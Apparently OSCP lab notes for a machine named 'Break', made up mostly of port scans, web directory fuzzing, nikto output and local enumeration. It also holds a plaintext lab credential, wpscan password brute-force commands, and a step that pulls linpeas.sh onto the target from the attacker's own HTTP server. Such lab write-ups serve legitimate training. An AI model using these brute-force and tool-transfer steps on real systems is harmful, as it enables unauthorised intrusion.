##### Machine Information
```markdown
IP ADDRESS: 10.11.1.101
HN: Break
OS: NIX box
EXPLOIT/PORT:
PRIVESC: PwnKit
USERS MENTIONED:

Administrator:
Name: Walter
E-mail: walter@oscp.thinc.local
Year of birth: 1982

Developer:
Name: Alfred
E-mail: alfred@oscp.thinc.local
Year of birth: 1988

Web Developer:
Name: Cory
E-mail: cory@oscp.thinc.local
Year of birth: 1985

Writer:
Name: Jasmine
E-mail: jasmine@oscp.thinc.local
Year of birth: 1983

CREDENTIALS: alfred:IHopeThisDoesNotExpire
```

------------------------------------------------------------------------------------
###### Initial Scanning  
#ping
```shell
#ping 

┌──(root㉿kali)-[/home/kali]
└─# ping 10.11.1.101         
PING 10.11.1.101 (10.11.1.101) 56(84) bytes of data.
64 bytes from 10.11.1.101: icmp_seq=1 ttl=63 time=60.4 ms
64 bytes from 10.11.1.101: icmp_seq=2 ttl=63 time=69.0 ms

```
#rustscan 
```shell
┌──(root㉿kali)-[/home/kali]
└─# rustscan -a 10.11.1.101
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.11.1.101:21
Open 10.11.1.101:22
Open 10.11.1.101:80
Open 10.11.1.101:139
Open 10.11.1.101:445
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 17:53 EDT
Initiating Ping Scan at 17:53
Scanning 10.11.1.101 [4 ports]
Completed Ping Scan at 17:53, 0.10s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:53
Completed Parallel DNS resolution of 1 host. at 17:53, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 17:53
Scanning 10.11.1.101 [5 ports]
Discovered open port 445/tcp on 10.11.1.101
Discovered open port 22/tcp on 10.11.1.101
Discovered open port 21/tcp on 10.11.1.101
Discovered open port 139/tcp on 10.11.1.101
Discovered open port 80/tcp on 10.11.1.101
Completed SYN Stealth Scan at 17:53, 0.09s elapsed (5 total ports)
Nmap scan report for 10.11.1.101
Host is up, received echo-reply ttl 63 (0.056s latency).
Scanned at 2023-03-31 17:53:30 EDT for 0s

PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
           Raw packets sent: 9 (372B) | Rcvd: 6 (248B)

```
#quick #nmap #for #rustscan
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p 21,22,80,139,445 -Pn 10.11.1.101
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 17:53 EDT
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.69% done; ETC: 17:53 (0:00:00 remaining)
Nmap scan report for 10.11.1.101
Host is up (0.057s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 625416aa0b7377611ba445c0f82e5bed (RSA)
|   256 f44223276e90febcf4d9326f8f6b7434 (ECDSA)
|_  256 c66afa446e3137dae39edc29f4486bb8 (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: TryHarder oscp.thinc.local
| http-robots.txt: 1 disallowed entry 
|_/passwords/
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BREAK; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m47s, deviation: 2h18m34s, median: -12s
| smb2-time: 
|   date: 2023-03-31T21:53:36
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: BREAK, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: break
|   NetBIOS computer name: BREAK\x00
|   Domain name: \x00
|   FQDN: break
|_  System time: 2023-03-31T17:53:37-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds

```
#nmapudp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sU 10.11.1.101                            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 17:57 EDT
Stats: 0:03:00 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 18.27% done; ETC: 18:14 (0:13:25 remaining)
Nmap scan report for 10.11.1.101
Host is up (0.086s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT    STATE         SERVICE
123/udp open          ntp
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm

Nmap done: 1 IP address (1 host up) scanned in 1098.87 seconds

```
#nmapfulltcp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p- -Pn 10.11.1.101
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 17:59 EDT
Nmap scan report for 10.11.1.101
Host is up (0.065s latency).
Not shown: 65529 closed tcp ports (reset)
PORT    STATE    SERVICE     VERSION
21/tcp  open     ftp         vsftpd 3.0.3
22/tcp  open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 625416aa0b7377611ba445c0f82e5bed (RSA)
|   256 f44223276e90febcf4d9326f8f6b7434 (ECDSA)
|_  256 c66afa446e3137dae39edc29f4486bb8 (ED25519)
25/tcp  filtered smtp
80/tcp  open     http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: TryHarder oscp.thinc.local
| http-robots.txt: 1 disallowed entry 
|_/passwords/
139/tcp open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BREAK; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m47s, deviation: 2h18m34s, median: -13s
|_nbstat: NetBIOS name: BREAK, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-03-31T22:01:54
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: break
|   NetBIOS computer name: BREAK\x00
|   Domain name: \x00
|   FQDN: break
|_  System time: 2023-03-31T18:01:54-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 163.04 seconds

```
```
##### Initial Scanning Notes:

##### Searchsploit:
#searchsploit
```
##### Web Fuzzing : Dirsearch // GoBuster // ffuf // nikto
#gobuster #/usr/share/dirb/wordlists/common
```shell
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.11.1.101:80 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.1.101:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              html,asp,aspx,php,txt
[+] Timeout:                 10s
===============================================================
2023/03/31 17:56:14 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.php             (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.hta.asp             (Status: 403) [Size: 276]
/.hta.aspx            (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htaccess.aspx       (Status: 403) [Size: 276]
/.htaccess.asp        (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.asp        (Status: 403) [Size: 276]
/.htpasswd.aspx       (Status: 403) [Size: 276]
/assets               (Status: 301) [Size: 311] [--> http://10.11.1.101/assets/]/contactus.html       (Status: 200) [Size: 7296]
/images               (Status: 301) [Size: 311] [--> http://10.11.1.101/images/]
/index.html           (Status: 200) [Size: 9499]
/index.html           (Status: 200) [Size: 9499]
/manual               (Status: 301) [Size: 311] [--> http://10.11.1.101/manual/]
/passwords            (Status: 301) [Size: 314] [--> http://10.11.1.101/passwords/]
/robots.txt           (Status: 200) [Size: 36]
/robots.txt           (Status: 200) [Size: 36]
/server-status        (Status: 403) [Size: 276]
Progress: 27646 / 27690 (99.84%)
===============================================================
2023/03/31 17:59:24 Finished
===============================================================


```

#dirsearch #/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```shell
#dirsearch medium.txt
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://10.11.1.101:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /root/.dirsearch/reports/10.11.1.101-80/_23-03-31_18-01-59.txt

Error Log: /root/.dirsearch/logs/errors-23-03-31_18-01-59.log

Target: http://10.11.1.101:80/

[18:02:00] Starting: 
[18:02:00] 301 -  311B  - /images  ->  http://10.11.1.101/images/
[18:02:01] 301 -  311B  - /assets  ->  http://10.11.1.101/assets/
[18:02:02] 301 -  311B  - /manual  ->  http://10.11.1.101/manual/
[18:02:11] 301 -  314B  - /passwords  ->  http://10.11.1.101/passwords/
[18:05:52] 403 -  276B  - /server-status

# tcm recommended dirsearch
dirsearch -e php,html,js,asp,aspx -u http://10.11.1.234:10443 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

#nikto #-a
```c
┌──(root㉿kali)-[/home/kali]
└─# nikto -host 10.11.1.101:80  
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.11.1.101
+ Target Hostname:    10.11.1.101
+ Target Port:        80
+ Start Time:         2023-03-31 17:56:33 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-3268: /passwords/: Directory indexing found.
+ Entry '/passwords/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 251b, size: 52ea0d8467841, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /passwords/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7916 requests: 0 error(s) and 16 item(s) reported on remote host
+ End Time:           2023-03-31 18:05:47 (GMT-4) (554 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```shell
gobuster dir -u http://10.11.1.234:10443 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx

```

#basic #ffuf
```markdown
ffuf -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u https://10.11.1.237/FUZZ
```

#wpscan #wordpress #plugin #reverse #shell #bruteforce #admin/princess #credentials
```markdown
# Basic wpscan
wpscan --url http://10.11.1.234:80

# WPscan bruteforce - reference 10.11.1.234 
wpscan --url http://10.11.1.234:80/ --enumerate u,p,t -P rockyou.txt
```

Fuzzing notes:
- make sure if having issues to fuzzing to use all wordlists on kali machina and download seclists worst case scenario

##### Reverse Shell / Shell 

```shell
```

##### Foothold Enumeration Linux
#sudo #failed 
```shell
alfred@break:~/usr/bin$ sudo -l
[sudo] password for alfred: 
Sorry, user alfred may not run sudo on break.
alfred@break:~/usr/bin$ 
```
#cat #/etc/crontab
```shell
alfred@break:~/usr/bin$ cat /etc/crontab
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly 
```
#uname #-a #kernelprivesc
```shell
alfred@break:~$ uname -a
Linux break 4.4.0-166-generic #195-Ubuntu SMP Tue Oct 1 09:35:25 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```
#cat #/etc*/release
```shell
alfred@break:~$ cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.6 LTS"
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```
#lsb_release #-a 
```shell
alfred@break:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.6 LTS
Release:	16.04
Codename:	xenial
alfred@break:~$ 
```
#transfered #linpeas
```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# ls               
linpeas.sh
                                                                          
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.101]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.11.1.101 - - [31/Mar/2023 19:51:13] "GET /linpeas.sh HTTP/1.1" 200 -

# pulled over linpeas
alfred@break:/tmp$ wget http://192.168.119.132/linpeas.sh
linpeas.sh                    100%[==============================================>] 808.68K  1.30MB/s    in 0.6s 
```
##### Foothold Enumeration Windows

```SHELL
```
##### Privilege Escalation
```shell
```

##### Flag
```powershell
```


###### Lessons Learned:








